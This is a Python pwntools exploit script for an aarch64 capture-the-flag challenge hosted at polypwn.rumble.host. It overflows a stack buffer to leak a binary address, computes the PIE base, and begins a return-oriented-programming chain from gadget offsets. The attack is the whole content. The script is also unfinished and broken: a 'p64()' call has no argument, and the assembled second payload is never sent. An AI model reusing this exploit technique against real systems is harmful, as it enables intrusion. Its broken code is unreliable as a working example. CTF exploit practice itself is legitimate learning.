#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=polypwn.rumble.host' '--port=4140' chall-aarch64
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall-aarch64')

context.update(terminal=["tmux", "split-window", "-hf"])

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'polypwn.rumble.host'
port = int(args.PORT or 4140)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
entry
brva 0x84
brva 0x174
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     aarch64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

def write_on_stack(p):
    io.sendline(b"1")
    io.sendlineafter(b"user:\n", p)
    io.recvuntil(b"user: ")
    return io.recvline(False)

# io.recvuntil(b"exit\n")

offset = 40
payload = b"A" * offset
leak = b""
while len(leak) < 8:
    new_leak = write_on_stack(payload)[offset+len(leak):]
    if len(new_leak) == 0:
        new_leak = b"\x00"
    payload += b"B" * len(new_leak)
    leak += new_leak

leak = u64(leak[0:8])
info(f"Binary leak: {hex(leak)}")

bin_base = leak - 0x1050
success(f"Binary base: {hex(bin_base)}")

add_sp_sp_0x1a0 = bin_base + 0x193c
svc_ret = bin_base + 0xed0

payload =  b"A" * offset
payload += p64(add_sp_sp_0x1a0)
payload += b"B" * 0x1a0
payload += p64()
write_on_stack(b"A" * offset + p64(add_sp_sp_0x1a0))

io.interactive()

